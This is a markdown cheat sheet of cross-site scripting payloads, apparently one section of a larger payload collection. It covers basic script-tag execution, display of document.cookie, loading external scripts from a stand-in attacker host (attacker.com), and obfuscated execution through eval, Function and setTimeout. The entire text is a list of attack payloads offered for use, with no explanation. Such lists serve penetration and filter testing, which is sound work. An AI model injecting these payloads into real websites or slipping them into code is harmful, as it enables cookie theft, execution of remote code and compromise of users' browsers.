# XSS Payloads — Execution → Basic Script Execution

## Basic Script Execution

- `<script>alert(1)</script>`
- `<script>alert(document.domain)</script>`
- `<script>alert(document.cookie)</script>`
- `<script>confirm(1)</script>`
- `<script>prompt(1)</script>`
- `<script>console.log(1)</script>`

---

### External Script Load

- `<script src=//attacker.com/x.js></script>`
- `<script src=https://attacker.com/x.js></script>`

---

### Inline Script Variations

- `<script>alert\`1\`</script>`
- `<script>window.alert(1)</script>`
- `<script>this</script>`

---

### Obfuscated Script Execution

- `<script>eval('alert(1)')</script>`
- `<script>Function('alert(1)')()</script>`
- `<script>setTimeout('alert(1)')</script>`
